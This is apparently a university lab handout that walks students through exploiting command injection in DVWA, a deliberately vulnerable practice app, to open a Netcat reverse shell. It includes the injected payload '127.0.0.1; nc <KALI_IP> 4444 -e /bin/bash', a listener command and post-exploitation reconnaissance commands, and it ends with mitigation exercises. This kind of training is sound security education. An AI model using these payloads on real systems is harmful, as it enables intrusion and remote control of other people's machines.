
## **INT302: Kali Linux Tools and System Security – Lab 9: Reverse Shell via Netcat Using DVWA Command Execution**

---

## **Lab Overview**

In this lab, participants will learn how attackers exploit **command execution vulnerabilities** in web applications to gain **remote shell access**. Using **Damn Vulnerable Web Application (DVWA)** and **Netcat**, students will establish a **reverse shell connection** from a vulnerable web server to an attacker machine.

This lab demonstrates real‑world exploitation techniques used during penetration testing and highlights the risks of insecure input handling.

---

## **Lab Objectives**

By the end of this lab, you will be able to:

1. Understand how command execution vulnerabilities occur in web applications.
2. Configure and use Netcat as a listener for reverse shell connections.
3. Exploit DVWA’s command execution vulnerability to gain shell access.
4. Verify successful reverse shell connections.
5. Analyze the security impact of remote command execution vulnerabilities.

---

## **Tools Used**

* **DVWA (Damn Vulnerable Web Application)** – Intentionally vulnerable web application.
* **Netcat (nc)** – Networking utility for reading/writing network connections.
* **Kali Linux** – Attacker machine.
* **Web Browser** – To interact with DVWA.

---

## **Prerequisites**

* DVWA installed and running (local VM or lab network).
* DVWA security level set to **Low**.
* Kali Linux with Netcat installed.
* Basic understanding of TCP/IP and Linux commands.

---

## **Lab Steps**

---

## **Step 1: Preparing the Environment**

1. **Start DVWA**

   * Ensure Apache/MySQL are running.
   * Log in to DVWA.
   * Set DVWA Security Level to **Low**.

2. **Identify Target IP**

   * Note the IP address of the DVWA machine.
   * Example:

     ```
     http://192.168.204.128/dvwa
     ```

**Exercise 1:**

* Record the DVWA target IP address.

---

---

## **Step 2: Understanding Command Execution Vulnerability**

1. Navigate to:

   ```
   DVWA → Vulnerabilities → Command Injection
   ```

2. Observe the input field used to ping an IP address.

3. Test normal behavior:

   ```
   127.0.0.1
   ```

4. Test command injection:

   ```
   127.0.0.1; whoami
   ```

**Exercise 2:**

* Why does the `whoami` command execute successfully?

---

---

## **Step 3: Setting Up Netcat Listener (Attacker Side)**

1. On **Kali Linux**, start a Netcat listener:

```bash
nc -lvnp 4444
```

2. Ensure:

   * Port `4444` is not blocked
   * Kali IP address is reachable from DVWA

**Exercise 3:**

* What is the purpose of running Netcat in listening mode?

---

---

## **Step 4: Crafting the Reverse Shell Payload**

1. Use the following **Netcat reverse shell payload**:

```bash
nc <KALI_IP> 4444 -e /bin/bash
```

> Replace `<KALI_IP>` with your Kali Linux IP address.

2. Inject the payload into DVWA’s command execution input:

```bash
127.0.0.1; nc <KALI_IP> 4444 -e /bin/bash
```

3. Submit the request.

---

## **Step 5: Verifying Reverse Shell Connection**

1. Return to the Kali terminal.
2. Observe the incoming connection.

Example:

```
connect to [192.168.x.x] from (UNKNOWN) [192.168.x.x]
```

3. Run shell commands:

```bash
whoami
id
uname -a
```

**Exercise 4:**

* What user account is the reverse shell running as?

---

---

## **Step 6: Post‑Exploitation Validation**

1. Confirm system access:

```bash
pwd
ls
ifconfig
```

2. Determine privilege level:

```bash
id
```

3. Identify OS details:

```bash
cat /etc/os-release
```

**Exercise 5:**

* Why is a reverse shell more powerful than simple command execution?

---

---

## **Step 7: Security Impact and Risk Analysis**

**Exercise 6:**
Answer the following:

* What could an attacker do with persistent shell access?
* How could this vulnerability lead to full system compromise?
* Why is command execution considered a critical vulnerability?

---

---

## **Step 8: Mitigation and Defense**

1. Discuss secure coding practices:

   * Input validation
   * Command whitelisting
   * Use of safe APIs
   * Web Application Firewalls (WAF)

**Exercise 7:**

* List three defensive controls that would prevent this attack.

---

---

## **Conclusion**

In this lab, you successfully exploited a **command execution vulnerability** in DVWA to obtain a **reverse shell using Netcat**. You learned how attackers transition from web‑level access to system‑level control and why such vulnerabilities pose a severe security risk.

---

## **Deliverables**

Students must submit:

* Screenshots of Netcat listener and reverse shell
* Answers to all exercises
* A brief explanation of how the reverse shell was achieved

---
